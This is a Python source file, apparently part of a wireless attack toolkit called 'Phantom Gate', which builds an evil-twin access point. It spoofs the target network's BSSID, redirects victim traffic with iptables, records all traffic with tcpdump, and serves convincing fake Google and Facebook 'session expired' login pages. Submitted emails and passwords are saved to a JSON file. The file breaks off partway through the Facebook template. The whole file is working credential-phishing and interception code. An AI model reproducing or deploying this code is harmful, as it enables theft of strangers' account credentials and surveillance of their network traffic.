"""
Phantom Gate - Evil Portal Service

Creates an Evil Twin access point with:
- MAC address spoofing (BSSID cloning)
- Internet bridging via iptables NAT
- Captive portal with credential phishing
- Traffic capture

Requires: hostapd, dnsmasq, macchanger, iptables, tcpdump
"""

from __future__ import annotations
import os
import subprocess
import signal
import time
import tempfile
import threading
import ssl
import json
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
from datetime import datetime
from typing import Optional, Dict, List, Any
from pathlib import Path

# Import app logging to send messages to UI
try:
    from .logging import log as ui_log
    from .state import get_state
except ImportError:
    ui_log = None
    def get_state(): return None

# Base directories
BASE_DIR = Path(__file__).parent.parent
CAPTURES_DIR = BASE_DIR / 'captures'
PORTAL_TEMPLATES_DIR = Path(__file__).parent / 'portal_templates'


def portal_log(message: str, level: str = 'info'):
    """Log to both console and UI."""
    print(f"[PORTAL] {message}")
    if ui_log:
        ui_log(f"[👻] {message}", level)


class PhantomGateState:
    """State for the Evil Portal service."""
    
    def __init__(self):
        self.active = False
        self.target_essid: Optional[str] = None
        self.target_bssid: Optional[str] = None
        self.target_channel: Optional[str] = None
        self.mode: str = 'open'  # 'open' or 'wpa2'
        self.password: Optional[str] = None
        self.portal_type: str = 'google'  # 'google', 'facebook', 'generic'
        self.strategy: str = 'karma'  # 'karma', 'stealth', 'passive'
        self.forced_mode: bool = True # Backwards compat
        self.authorized_ips: set = set() # IPs allowed to bypass portal
        
        # Process handles
        self.hostapd_proc: Optional[subprocess.Popen] = None
        self.dnsmasq_proc: Optional[subprocess.Popen] = None
        self.tcpdump_proc: Optional[subprocess.Popen] = None
        self.portal_server: Optional[HTTPServer] = None
        self.portal_thread: Optional[threading.Thread] = None
        self.deauth_thread: Optional[threading.Thread] = None
        self.deauth_stop: threading.Event = threading.Event()
        self.deauth_proc: Optional[subprocess.Popen] = None
        
        # MAC management
        self.original_mac: Optional[str] = None
        self.spoofed_mac: Optional[str] = None
        self.out_interface: Optional[str] = None
        self.in_interface: Optional[str] = None
        
        # Captured data
        self.captured_credentials: List[Dict[str, Any]] = []
        self.connected_clients: List[str] = []
        
        # Temp files
        self.hostapd_conf: Optional[str] = None
        self.dnsmasq_conf: Optional[str] = None
        self.ssl_cert: Optional[str] = None
        self.ssl_key: Optional[str] = None


# Global state
_portal_state = PhantomGateState()


def get_portal_state() -> PhantomGateState:
    """Get the portal state singleton."""
    return _portal_state


# ─────────────────────────────────────────────────────────────────
# Adapter Discovery
# ─────────────────────────────────────────────────────────────────

def get_available_adapters() -> Dict[str, List[Dict[str, Any]]]:
    """
    List all network adapters grouped by type.
    
    Returns:
        {
            'internet': [{'name': 'eth0', 'type': 'ethernet', 'has_internet': True}, ...],
            'wireless': [{'name': 'wlan0', 'type': 'wireless', 'supports_ap': True}, ...]
        }
    """
    result = {'internet': [], 'wireless': []}
    
    try:
        # Get all interfaces
        output = subprocess.check_output(['ip', 'link', 'show'], text=True)
        interfaces = []
        for line in output.split('\n'):
            if ': ' in line and not line.startswith(' '):
                parts = line.split(': ')
                if len(parts) >= 2:
                    iface = parts[1].split('@')[0]
                    if iface != 'lo':
                        interfaces.append(iface)
        
        for iface in interfaces:
            info = {'name': iface, 'has_internet': False, 'type': 'unknown'}
            
            # Check if wireless
            wireless_path = f'/sys/class/net/{iface}/wireless'
            if os.path.exists(wireless_path):
                info['type'] = 'wireless'
                info['supports_ap'] = _check_ap_support(iface)
                result['wireless'].append(info)
            else:
                # Check interface type
                if iface.startswith('eth') or iface.startswith('enp') or iface.startswith('eno'):
                    info['type'] = 'ethernet'
                elif iface.startswith('wwan') or iface.startswith('usb'):
                    info['type'] = '4g_modem'
                elif iface.startswith('wlan') or iface.startswith('wlp'):
                    info['type'] = 'wireless'
                    info['supports_ap'] = _check_ap_support(iface)
                    result['wireless'].append(info)
                    continue
                
                # Check for internet connectivity
                info['has_internet'] = _check_internet(iface)
                result['internet'].append(info)
        
    except Exception as e:
        print(f"[!] Error enumerating adapters: {e}")
    
    return result


def _check_ap_support(interface: str) -> bool:
    """Check if wireless interface supports AP mode."""
    try:
        output = subprocess.check_output(['iw', 'list'], text=True, stderr=subprocess.DEVNULL)
        # Look for AP in supported modes
        in_supported_modes = False
        for line in output.split('\n'):
            if 'Supported interface modes:' in line:
                in_supported_modes = True
            elif in_supported_modes:
                if line.strip().startswith('*'):
                    if 'AP' in line:
                        return True
                else:
                    in_supported_modes = False
        return True  # Assume yes if we can't determine
    except:
        return True


def _check_internet(interface: str) -> bool:
    """Check if interface has internet connectivity."""
    try:
        # Check if interface has a default route
        output = subprocess.check_output(['ip', 'route'], text=True)
        return f'dev {interface}' in output and 'default' in output
    except:
        return False


# ─────────────────────────────────────────────────────────────────
# NetworkManager & RFKill
# ─────────────────────────────────────────────────────────────────

def set_nm_managed(interface: str, managed: bool):
    """
    Set interface managed state in NetworkManager.
    managed=False prevents NM from interfering with hostapd.
    """
    state = 'yes' if managed else 'no'
    try:
        # Check if nmcli exists
        subprocess.run(['nmcli', '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        
        subprocess.run(['nmcli', 'device', 'set', interface, 'managed', state], 
                      check=False, capture_output=True)
        if not managed:
            print(f"[+] Interface {interface} unmanaged by NetworkManager")
        else:
            print(f"[+] Interface {interface} set to managed by NetworkManager")
    except (FileNotFoundError, subprocess.CalledProcessError):
        pass  # nmcli not found or failed, ignore


def unblock_rfkill():
    """Ensure wireless is unblocked."""
    try:
        subprocess.run(['rfkill', 'unblock', 'wlan'], check=False)
        subprocess.run(['rfkill', 'unblock', 'wifi'], check=False)
    except:
        pass


# ─────────────────────────────────────────────────────────────────
# MAC Address Management
# ─────────────────────────────────────────────────────────────────

def get_current_mac(interface: str) -> Optional[str]:
    """Get current MAC address of an interface."""
    try:
        output = subprocess.check_output(['ip', 'link', 'show', interface], text=True)
        for line in output.split('\n'):
            if 'link/ether' in line:
                return line.split()[1].upper()
    except:
        pass
    return None


def spoof_mac(interface: str, target_mac: str) -> bool:
    """
    Spoof interface MAC to match target (BSSID cloning).
    
    Args:
        interface: Network interface to spoof
        target_mac: MAC address to clone (target AP's BSSID)
    
    Returns:
        True if successful
    """
    state = get_portal_state()
    
    # Save original MAC
    state.original_mac = get_current_mac(interface)
    if not state.original_mac:
        print(f"[!] Could not get current MAC for {interface}")
        return False
    
    try:
        # Bring interface down
        subprocess.run(['ip', 'link', 'set', interface, 'down'], check=True)
        
        # Try macchanger first
        try:
            subprocess.run(['macchanger', '-m', target_mac, interface], 
                         check=True, capture_output=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            # Fallback to ip link
            subprocess.run(['ip', 'link', 'set', interface, 'address', target_mac], check=True)
        
        # Bring interface up
        subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True)
        
        state.spoofed_mac = target_mac.upper()
        state.out_interface = interface
        print(f"[+] MAC spoofed: {state.original_mac} -> {state.spoofed_mac}")
        return True
        
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to spoof MAC: {e}")
        # Try to restore
        try:
            subprocess.run(['ip', 'link', 'set', interface, 'up'], check=False)
        except:
            pass
        return False


def restore_mac(interface: str = None) -> bool:
    """Restore original MAC address."""
    state = get_portal_state()
    
    interface = interface or state.out_interface
    original = state.original_mac
    
    if not interface or not original:
        return True  # Nothing to restore
    
    try:
        subprocess.run(['ip', 'link', 'set', interface, 'down'], check=True)
        
        try:
            subprocess.run(['macchanger', '-m', original, interface],
                         check=True, capture_output=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            subprocess.run(['ip', 'link', 'set', interface, 'address', original], check=True)
        
        subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True)
        
        print(f"[+] MAC restored: {original}")
        state.original_mac = None
        state.spoofed_mac = None
        return True
        
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to restore MAC: {e}")
        return False


# ─────────────────────────────────────────────────────────────────
# hostapd Configuration
# ─────────────────────────────────────────────────────────────────

def generate_hostapd_conf(interface: str, essid: str, channel: str, 
                          mode: str = 'open', password: str = None) -> str:
    """
    Generate hostapd configuration file.
    
    Args:
        interface: Wireless interface for AP
        essid: Network name to broadcast
        channel: Channel number
        mode: 'open' for no password, 'wpa2' for WPA2-PSK
        password: WPA2 password (required if mode='wpa2')
    
    Returns:
        Path to generated config file
    """
    # Detect if 5GHz channel (channels > 14 are 5GHz)
    try:
        ch_num = int(channel)
    except:
        ch_num = 1
    
    if ch_num > 14:
        # 5GHz band
        hw_mode = 'a'
        extra_config = """
# 802.11n/ac support for 5GHz
ieee80211n=1
ieee80211ac=1
"""
        portal_log(f"Using 5GHz mode (channel {ch_num})")
    else:
        # 2.4GHz band
        hw_mode = 'g'
        extra_config = """
# 802.11n support for 2.4GHz
ieee80211n=1
"""
        portal_log(f"Using 2.4GHz mode (channel {ch_num})")
    
    config = f"""# Phantom Gate - hostapd configuration
interface={interface}
driver=nl80211
ssid={essid}
hw_mode={hw_mode}
channel={channel}
wmm_enabled=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
{extra_config}
"""
    
    if mode == 'wpa2' and password:
        config += f"""
wpa=2
wpa_passphrase={password}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
"""
    
    # Write to temp file
    fd, path = tempfile.mkstemp(prefix='phantomgate_hostapd_', suffix='.conf')
    with os.fdopen(fd, 'w') as f:
        f.write(config)
    
    portal_log(f"hostapd config written to {path}")
    return path


def start_hostapd(config_path: str) -> Optional[subprocess.Popen]:
    """Start hostapd with given config."""
    state = get_portal_state()
    
    try:
        proc = subprocess.Popen(
            ['hostapd', config_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        state.hostapd_proc = proc
        state.hostapd_conf = config_path
        print(f"[+] hostapd started (PID: {proc.pid})")
        return proc
    except FileNotFoundError:
        print("[!] hostapd not found. Install with: sudo apt install hostapd")
        return None
    except Exception as e:
        print(f"[!] Failed to start hostapd: {e}")
        return None


def stop_hostapd():
    """Stop hostapd process."""
    state = get_portal_state()
    
    if state.hostapd_proc:
        try:
            state.hostapd_proc.terminate()
            state.hostapd_proc.wait(timeout=5)
        except:
            state.hostapd_proc.kill()
        state.hostapd_proc = None
        print("[+] hostapd stopped")
    
    if state.hostapd_conf and os.path.exists(state.hostapd_conf):
        os.unlink(state.hostapd_conf)
        state.hostapd_conf = None


# ─────────────────────────────────────────────────────────────────
# dnsmasq Configuration
# ─────────────────────────────────────────────────────────────────

def generate_dnsmasq_conf(interface: str, strategy: str = 'karma') -> str:
    """
    Generate dnsmasq configuration for DHCP and DNS.
    
    Strategies:
        karma: Redirect ALL DNS to portal IP (Aggressive)
        stealth: Redirect ALL DNS to portal IP (so we can selectively drop/redirect)
        passive: Only redirect target domains (Google/FB) to portal IP
    """
    portal_ip = '192.168.4.1'
    
    config = f"""# Phantom Gate - dnsmasq configuration
interface={interface}
dhcp-range=192.168.4.10,192.168.4.250,12h
dhcp-option=3,{portal_ip}
dhcp-option=6,{portal_ip}
no-resolv
log-queries
server=8.8.8.8
server=1.1.1.1
"""
    
    if strategy in ['karma', 'stealth']:
        # Redirect ALL DNS to portal -> REMOVED for Walled Garden
        # We now let them resolve REAL IPs, and catch them via IPTables.
        # This allows us to simply ACCEPT traffic from authorized IPs later.
        pass
    else:
        # Passive mode - only intercept specific domains
        config += f"""
# Passive mode - intercept auth domains only
address=/accounts.google.com/{portal_ip}
address=/login.google.com/{portal_ip}
address=/www.facebook.com/{portal_ip}
address=/m.facebook.com/{portal_ip}
address=/login.facebook.com/{portal_ip}
"""
    
    fd, path = tempfile.mkstemp(prefix='phantomgate_dnsmasq_', suffix='.conf')
    with os.fdopen(fd, 'w') as f:
        f.write(config)
    
    return path


def start_dnsmasq(config_path: str) -> Optional[subprocess.Popen]:
    """Start dnsmasq with given config."""
    state = get_portal_state()
    
    try:
        proc = subprocess.Popen(
            ['dnsmasq', '-C', config_path, '-d'],  # -d for no daemon
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        state.dnsmasq_proc = proc
        state.dnsmasq_conf = config_path
        print(f"[+] dnsmasq started (PID: {proc.pid})")
        return proc
    except FileNotFoundError:
        print("[!] dnsmasq not found. Install with: sudo apt install dnsmasq")
        return None
    except Exception as e:
        print(f"[!] Failed to start dnsmasq: {e}")
        return None


def stop_dnsmasq():
    """Stop dnsmasq process."""
    state = get_portal_state()
    
    if state.dnsmasq_proc:
        try:
            state.dnsmasq_proc.terminate()
            state.dnsmasq_proc.wait(timeout=5)
        except:
            state.dnsmasq_proc.kill()
        state.dnsmasq_proc = None
        print("[+] dnsmasq stopped")
    
    if state.dnsmasq_conf and os.path.exists(state.dnsmasq_conf):
        os.unlink(state.dnsmasq_conf)
        state.dnsmasq_conf = None


# ─────────────────────────────────────────────────────────────────
# iptables NAT Bridge
# ─────────────────────────────────────────────────────────────────

def setup_nat_bridge(in_interface: str, out_interface: str, strategy: str = 'karma') -> bool:
    """
    Configure iptables for NAT based on strategy.
    
    Strategies:
        karma:   DNAT HTTP/HTTPS -> Portal (Captive Portal)
        stealth: DNAT HTTP -> Portal, DROP HTTPS (Frustration Trap)
        passive: Allow all, only DNAT specifically targeted traffic (Google/FB)
    """
    state = get_portal_state()
    state.in_interface = in_interface
    portal_ip = '192.168.4.1'
    
    try:
        # Enable IP forwarding
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1')
        portal_log("IP forwarding enabled")
        
        # Configure interface IP
        subprocess.run([
            'ip', 'addr', 'add', f'{portal_ip}/24', 'dev', out_interface
        ], check=False)  # May already exist
        
        # Flush existing rules
        subprocess.run(['iptables', '-t', 'nat', '-F'], check=False)
        subprocess.run(['iptables', '-F', 'FORWARD'], check=False)
        
        # NAT masquerade for internet access
        subprocess.run([
            'iptables', '-t', 'nat', '-A', 'POSTROUTING',
            '-o', in_interface, '-j', 'MASQUERADE'
        ], check=True)
        
        # Forward traffic
        subprocess.run([
            'iptables', '-A', 'FORWARD',
            '-i', out_interface, '-o', in_interface,
            '-j', 'ACCEPT'
        ], check=True)
        
        subprocess.run([
            'iptables', '-A', 'FORWARD',
            '-i', in_interface, '-o', out_interface,
            '-m', 'state', '--state', 'ESTABLISHED,RELATED',
            '-j', 'ACCEPT'
        ], check=True)
        
        if strategy == 'karma':
            # AGGRESSIVE: Redirect ALL HTTP/HTTPS to portal
            portal_log("Karma Mode: Redirecting ALL traffic to portal")
            subprocess.run([
                'iptables', '-t', 'nat', '-A', 'PREROUTING',
                '-i', out_interface, '-p', 'tcp', '--dport', '80',
                '-j', 'DNAT', '--to-destination', f'{portal_ip}:80'
            ], check=True)
            
            subprocess.run([
                'iptables', '-t', 'nat', '-A', 'PREROUTING',
                '-i', out_interface, '-p', 'tcp', '--dport', '443',
                '-j', 'DNAT', '--to-destination', f'{portal_ip}:443'
            ], check=True)
            
        elif strategy == 'stealth':
            # STEALTH: Redirect HTTP, Drop HTTPS
            portal_log("Stealth Mode: Redirecting HTTP, BLACKHOLING HTTPS (IPv4+IPv6)")
            
            # Redirect HTTP -> Portal
            subprocess.run([
                'iptables', '-t', 'nat', '-A', 'PREROUTING',
                '-i', out_interface, '-p', 'tcp', '--dport', '80',
                '-j', 'DNAT', '--to-destination', f'{portal_ip}:80'
            ], check=True)
            
            # BLACKHOLE HTTPS
            # Block in both FORWARD and INPUT to be safe
            for cmd in ['iptables', 'ip6tables']:
                for chain in ['FORWARD', 'INPUT']:
                    subprocess.run([
                        cmd, '-I', chain, '1',
                        '-i', out_interface, '-p', 'tcp', '--dport', '443',
                        '-j', 'DROP'
                    ], check=False)

        else:
            # PASSIVE MODE (Legacy Interception)
            portal_log("Mode: Passive (Legacy HTTP Interception)")
            portal_log("!!! BLUNT NOTE: This is practically useless in 2026 due to HSTS and Global HTTPS.")
            portal_log("!!! It will only catch devices hitting plain HTTP legacy URLs.")
            
            subprocess.run([
                'iptables', '-t', 'nat', '-A', 'PREROUTING',
                '-i', out_interface, '-p', 'tcp', '-d', portal_ip, '--dport', '80',
                '-j', 'DNAT', '--to-destination', f'{portal_ip}:80'
            ], check=True)
            
            subprocess.run([
                'iptables', '-t', 'nat', '-A', 'PREROUTING',
                '-i', out_interface, '-p', 'tcp', '-d', portal_ip, '--dport', '443',
                '-j', 'DNAT', '--to-destination', f'{portal_ip}:443'
            ], check=True)
        
        portal_log(f"NAT bridge configured ({strategy}): {in_interface} <-> {out_interface}")
        return True
        
    except Exception as e:
        portal_log(f"Failed to configure NAT: {e}", "error")
        return False



def cleanup_nat():
    """Remove iptables rules."""
    try:
        # Flush IPv4
        subprocess.run(['iptables', '-t', 'nat', '-F'], check=False)
        subprocess.run(['iptables', '-F', 'FORWARD'], check=False)
        subprocess.run(['iptables', '-F', 'INPUT'], check=False) # Be careful, but memento manages this
        
        # Flush IPv6
        subprocess.run(['ip6tables', '-F', 'FORWARD'], check=False)
        subprocess.run(['ip6tables', '-F', 'INPUT'], check=False)
        
        print("[+] NAT and Filter rules flushed (IPv4+IPv6)")
    except Exception as e:
        print(f"[!] Cleanup NAT error: {e}")


# ─────────────────────────────────────────────────────────────────
# Traffic Capture
# ─────────────────────────────────────────────────────────────────

def start_traffic_capture(interface: str) -> Optional[subprocess.Popen]:
    """Start tcpdump to capture all victim traffic."""
    state = get_portal_state()
    
    CAPTURES_DIR.mkdir(exist_ok=True)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    pcap_file = CAPTURES_DIR / f'portal_{timestamp}.pcap'
    
    try:
        proc = subprocess.Popen([
            'tcpdump', '-i', interface, '-w', str(pcap_file),
            '-U',  # Unbuffered
            'not', 'port', '22'  # Exclude SSH
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        state.tcpdump_proc = proc
        print(f"[+] Traffic capture started: {pcap_file}")
        return proc
    except FileNotFoundError:
        print("[!] tcpdump not found. Install with: sudo apt install tcpdump")
        return None
    except Exception as e:
        print(f"[!] Failed to start traffic capture: {e}")
        return None


def stop_traffic_capture():
    """Stop tcpdump."""
    state = get_portal_state()
    
    if state.tcpdump_proc:
        try:
            state.tcpdump_proc.terminate()
            state.tcpdump_proc.wait(timeout=5)
        except:
            state.tcpdump_proc.kill()
        state.tcpdump_proc = None
        print("[+] Traffic capture stopped")


# ─────────────────────────────────────────────────────────────────
# SSL Certificate Generation
# ─────────────────────────────────────────────────────────────────

def generate_ssl_cert() -> tuple[str, str]:
    """Generate self-signed SSL certificate for HTTPS portal."""
    cert_path = tempfile.mktemp(prefix='phantomgate_', suffix='.crt')
    key_path = tempfile.mktemp(prefix='phantomgate_', suffix='.key')
    
    try:
        subprocess.run([
            'openssl', 'req', '-x509', '-nodes', '-days', '1',
            '-newkey', 'rsa:2048',
            '-keyout', key_path,
            '-out', cert_path,
            '-subj', '/CN=portal.local/O=Phantom Gate/C=US'
        ], check=True, capture_output=True)
        
        print("[+] SSL certificate generated")
        return cert_path, key_path
    except Exception as e:
        print(f"[!] Failed to generate SSL cert: {e}")
        return None, None


# ─────────────────────────────────────────────────────────────────
# Captive Portal HTTP Server
# ─────────────────────────────────────────────────────────────────

class PhishingHandler(SimpleHTTPRequestHandler):
    """HTTP handler for credential phishing."""
    
    debug_mode = True  # Show obvious phishing for testing
    forced_mode = False
    
    def log_message(self, format, *args):
        """Suppress default logging."""
        pass

def authorize_client(client_ip: str):
    """
    Authorize a client IP to bypass the portal (Walled Garden).
    Inserts iptables rules to ACCEPT traffic from this IP before DNAT/DROP rules.
    """
    state = get_portal_state()
    if client_ip in state.authorized_ips:
        return

    portal_log(f"Authorizing client: {client_ip} (Granting Internet Access)")
    try:
        # 1. Bypass DNAT (PREROUTING) - Allow generic traffic
        subprocess.run([
            'iptables', '-t', 'nat', '-I', 'PREROUTING', '1',
            '-s', client_ip, '-j', 'ACCEPT'
        ], check=True)
        
        # 2. Bypass Filter (FORWARD) - Allow specific traffic (crucial for Stealth mode HTTPS drop)
        subprocess.run([
            'iptables', '-I', 'FORWARD', '1',
            '-s', client_ip, '-j', 'ACCEPT'
        ], check=True)
        
        state.authorized_ips.add(client_ip)
        portal_log(f"Client {client_ip} authorized successfully.")
    except Exception as e:
        portal_log(f"Failed to authorize client {client_ip}: {e}", "error")

class PhishingHandler(SimpleHTTPRequestHandler):
    """Handle phishing page requests."""
    
    def log_message(self, format, *args):
        """Suppress default logging."""
        pass
    
    def do_GET(self):
        """Serve phishing page."""
        self.send_phishing_page()
    
    def do_POST(self):
        """Handle credential submission."""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # Parse credentials
        # Parse credentials (handles both JSON and Form Data)
        try:
            # Try JSON first
            data = json.loads(post_data)
            email = data.get('email', '')
            password = data.get('password', '')
            attempt = data.get('attempt', 1)
        except json.JSONDecodeError:
            # Fallback to Form Data
            params = parse_qs(post_data)
            email = params.get('email', params.get('username', ['']))[0]
            password = params.get('password', params.get('pass', ['']))[0]
            attempt = 1
        
        if email or password:
            # Determine which page captured this
            host = self.headers.get('Host', '')
            portal_type = 'debug'
            if 'google' in host.lower():
                portal_type = 'google'
            elif 'facebook' in host.lower():
                portal_type = 'facebook'
            
            cred = {
                'timestamp': datetime.now().isoformat(),
                'email': email,
                'password': password,
                'client_ip': self.client_address[0],
                'user_agent': self.headers.get('User-Agent', ''),
                'portal_type': portal_type,
                'host': host,
                'attempt': attempt,
            }
            state = get_portal_state()
            state.captured_credentials.append(cred)
            print(f"[!] CREDENTIAL CAPTURED: {email} / {password} (from {host})")
            
            # Save to file
            creds_file = CAPTURES_DIR / 'captured_credentials.json'
            try:
                CAPTURES_DIR.mkdir(exist_ok=True)
                existing = []
                if creds_file.exists():
                    existing = json.loads(creds_file.read_text())
                existing.append(cred)
                creds_file.write_text(json.dumps(existing, indent=2))
            except Exception as e:
                print(f"[!] Failed to save credentials: {e}")
        
        # Authorize Client on Success (Attempt 2)
        if email and password and attempt == 2:
            authorize_client(self.client_address[0])

        # Redirect to "error" or real site
        self.send_response(200 if attempt == 1 else 302)
        if attempt == 2:
             self.send_header('Location', 'https://accounts.google.com/')
        self.end_headers()
    
    def send_phishing_page(self):
        """Send the appropriate phishing page based on Host header."""
        host = self.headers.get('Host', '').lower()
        path = self.path.lower()
        
        # Log for debugging
        print(f"[PORTAL] Request: {host}{path} from {self.client_address[0]}")
        
        # Auto-detect page type from Host header
        if 'google' in host or 'gmail' in host or 'accounts.google' in host:
            page_type = 'google'
        elif 'facebook' in host or 'fb.com' in host:
            page_type = 'facebook'
        else:
            # If Forced Mode is ON, any random site should fallback to the Google fake page
            # This creates the "universal portal" effect the user wants
            if self.forced_mode:
                page_type = 'google'
            else:
                # Default to DEBUG template for testing in passive mode
                page_type = 'debug'
        
        # Get template
        template = self._get_template(page_type)
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Content-Length', len(template))
        self.end_headers()
        self.wfile.write(template.encode())
    
    def _get_template(self, page_type: str) -> str:
        """Get HTML template for phishing page."""
        templates = {
            'google': self._google_template(),
            'facebook': self._facebook_template(),
            'debug': self._debug_template(),
        }
        return templates.get(page_type, templates['debug'])
    
    def _google_template(self) -> str:
        """Google session expired template (New Realistic)."""
        try:
            template_path = Path('/home/kozi/sniff/templates/google_login.html')
            if template_path.exists():
                return template_path.read_text()
        except Exception as e:
            print(f"Error loading google template: {e}")
        
        # Fallback to old simple template if file missing
        return '''<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Roboto', Arial, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; padding: 48px 40px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.12); max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 16px; }
        .logo svg { width: 75px; height: 24px; }
        h1 { font-size: 24px; font-weight: 400; color: #202124; text-align: center; margin-bottom: 8px; }
        .subtitle { color: #5f6368; font-size: 16px; text-align: center; margin-bottom: 24px; }
        .error-box { background: #fce8e6; border-radius: 4px; padding: 12px 16px; margin-bottom: 24px; color: #c5221f; font-size: 14px; }
        .input-group { margin-bottom: 24px; }
        input[type="email"], input[type="password"] { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
        input:focus { outline: none; border-color: #1a73e8; }
        .forgot { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
        .btn-row { display: flex; justify-content: space-between; align-items: center; margin-top: 32px; }
        .btn { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
        .btn:hover { background: #1557b0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 75 24"><path fill="#4285F4" d="M0 8.5c0-4.7 3.8-8.5 8.5-8.5 2.3 0 4.4.9 6 2.4l-1.7 1.6c-1.2-1.1-2.7-1.8-4.3-1.8-3.5 0-6.3 2.8-6.3 6.3s2.8 6.3 6.3 6.3c3.2 0 5.5-1.9 6-4.5H8.5V8.3h10.1c.1.5.2 1.1.2 1.8 0 5.4-3.6 9.2-10.3 9.2-5.9 0-10.5-4.3-8.5-10.8z"/><path fill="#EA4335" d="M25 7c3.3 0 6 2.7 6 6.1 0 3.4-2.7 6.1-6 6.1s-6-2.7-6-6.1c0-3.4 2.7-6.1 6-6.1zm0 9.8c1.8 0 3.4-1.5 3.4-3.7 0-2.2-1.6-3.7-3.4-3.7-1.8 0-3.4 1.5-3.4 3.7 0 2.2 1.6 3.7 3.4 3.7z"/><path fill="#FBBC05" d="M37 7c3.3 0 6 2.7 6 6.1 0 3.4-2.7 6.1-6 6.1s-6-2.7-6-6.1c0-3.4 2.7-6.1 6-6.1zm0 9.8c1.8 0 3.4-1.5 3.4-3.7 0-2.2-1.6-3.7-3.4-3.7-1.8 0-3.4 1.5-3.4 3.7 0 2.2 1.6 3.7 3.4 3.7z"/><path fill="#4285F4" d="M49 7c2.9 0 5.3 2.2 5.3 5.9v.7H46.1c.2 1.9 1.6 3.2 3.4 3.2 1.3 0 2.2-.5 2.8-1.3l2 1.3c-1 1.5-2.7 2.4-4.8 2.4-3.3 0-6-2.7-6-6.1 0-3.4 2.5-6.1 5.5-6.1zm2.7 4.8c-.2-1.5-1.4-2.6-2.8-2.6-1.5 0-2.7 1.1-3 2.6h5.8z"/><path fill="#34A853" d="M55 1h2.6v17.7H55z"/><path fill="#EA4335" d="M63.5 7c3 0 5.5 2.7 5.5 6.1 0 3.4-2.5 6.1-5.5 6.1-1.8 0-3-.8-3.7-1.7v1.4h-2.6V1h2.6v7.3c.7-.9 1.9-1.3 3.7-1.3zm-.4 9.8c1.8 0 3.3-1.5 3.3-3.7 0-2.2-1.5-3.7-3.3-3.7-1.8 0-3.3 1.5-3.3 3.7 0 2.2 1.5 3.7 3.3 3.7z"/></svg>
        </div>
        <h1>Session expired</h1>
        <p class="subtitle">Sign in again to continue</p>
        <div class="error-box">Your session has expired. Please sign in again to continue.</div>
        <form method="POST" action="/login">
            <div class="input-group">
                <input type="email" name="email" placeholder="Email or phone" required autofocus>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Enter your password" required>
            </div>
            <a href="#" class="forgot">Forgot password?</a>
            <div class="btn-row">
                <a href="#" class="forgot">Create account</a>
                <button type="submit" class="btn">Sign in</button>
            </div>
        </form>
    </div>
</body>
</html>'''
    
    def _facebook_template(self) -> str:
        """Facebook login template."""
        return '''<!DOCTYPE html>
<html>
<head>
    <title>Log in to Facebook</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { display: flex; flex-direction: column; align-items: center; }
        .logo { margin-bottom: 20px; }
        .logo svg { width: 240px; height: 90px; }
        .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 396px; }
        .error { background: #ffebe8; border: 1px solid #dd3c10; border-radius: 3px; padding: 10px; margin-bottom: 16px; color: #333; font-size: 13px; }
        input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
        input:focus { outline: none; border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
        .btn { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; }
        .btn:hover { background: #166fe5; }
        .forgot { text-align: center; display: block; margin: 16px 0; color: #1877f2; text-decoration: none; font-size: 14px; }
        .divider { border-top: 1px solid #dadde1; margin: 20px 0; }
        .create { display: block; width: fit-content; margin: 0 auto; padding: 12px 24px; background: #42b72a; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 240 45"><path fill="#1877f2" d="M0 22.5C0 10.1 10.1 0 22.5 0S45 10.1 45 22.5c0 11.2-8.2 20.5-19 22.2v-15.7h5.2l1-6.5h-6.2v-4.2c0-1.8.9-3.5 3.6-3.5h2.8v-5.5s-2.5-.4-4.9-.4c-5 0-8.3 3-8.3 8.5v5h-5.6v6.5h5.6V44.7C8.2 43 0 33.7 0 22.5z"/><text x="50" y="32" font-size="24" font-weight="bold" fill="#1877f2">facebook</text></svg>
        </div>
        <div class="box">
            <div class="error">Your session has expired. Please log in again.</div>
